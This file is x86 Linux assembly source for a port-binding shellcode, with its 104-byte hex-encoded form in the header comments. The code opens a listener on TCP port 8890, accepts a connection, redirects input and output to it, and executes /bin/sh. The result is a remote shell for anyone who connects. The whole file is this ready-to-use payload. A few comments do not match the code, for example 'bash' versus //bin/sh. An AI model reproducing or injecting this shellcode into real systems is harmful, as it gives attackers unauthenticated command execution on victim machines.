;portbind_shellcode.asm

;Author Javier Tejedor
;Date 31/08/2014
;Info: look /usr/include/linux/net.h to see the calls to sys_socket_call

;shellcode:
;"\x31\xf6\x6a\x66\x58\x6a\x01\x5b\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x6a\x02\x5b\x56\x66\x68\x1e\x61\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x6a\x66\x58\xcd\x80\xb3\x04\x6a\x05\x52\xb0\x66\x89\xe1\xcd\x80\xb3\x05\x56\x56\x52\x6a\x66\x58\x89\xe1\xcd\x80\x89\xc3\x6a\xff\x59\x41\x6a\x3f\x58\xcd\x80\xe3\xf8\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"
;104 bytes

global _start

section .text

_start:
	
	;create socket	
	;syscall: 102
	;int socket(int domain, int type, int protocol);		
	xor esi, esi
	push 0x66
	pop eax		;syscall: 102
	push 0x1
	pop ebx		;SYS_SOCKET
	push esi	;arg3, protocol. IPPROTO_IP = 0 
	push 0x1	;arg2, type.	 SOCK_STREAM = 1
	push 0x2	;arg1, domain.	 AF_INET = 2
	mov ecx, esp
	int 0x80
	mov edx, eax	;save the socket reference into esi

	;create bind
	;syscall: 
	;bind(socket, (struct sockaddr *)&sin, sizeof(sin));	
	push 0x2
	pop ebx
	;struct sockaddr_in
	push esi		;member3, sin_addr.s_add: 0 
	push WORD 0x611e	;member2, port 8890	
	push WORD 0x2		;member1, sin_addr.s_add: AF_INET = 2
	mov ecx, esp

	push 0x10
	push ecx		;charge the sockaddr_in structure
	push edx		;param1, socket
	mov ecx, esp
	push 0x66	
	pop eax			;syscall: 102
	int 0x80

	;listen connections
	;syscall: 102
	;int listen(int socket, int backlog);
	mov bl, 0x4	;SYS_LISTEN
	push 0x5	;arg2, backlog
	push edx	;arg1, socket
	mov al, 0x66	;syscall: 102
	mov ecx, esp
	int 0x80

	;accept remote connection
	;syscall: 102
	;int accept(int socket, struct sockaddr *restrict address, socklen_t *restrict address_len);
	mov bl, 5	;SYS_ACCEPT
	push esi	;arg3
	push esi	;arg2
	push edx	;arg1, socket
	push 0x66
	pop eax		;syscall: 102
	mov ecx, esp
	int 0x80
	mov ebx, eax

	;dup2
	;syscall: 66
	;int dup2(int fildes, int fildes2);
	push 0xffffffff	;jecxz jumps while ecx is 0
	pop ecx

dup2_call:
	inc ecx
	push 0x3f	;syscall: 66 ()
	pop eax
	int 0x80
	jecxz dup2_call	

	;execve /bin/bash
	;syscall 11
	xor eax, eax
        push eax
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp
	push eax
	mov ecx, esp
	push eax
	mov edx, esp
        mov al, 0xb
        int 0x80
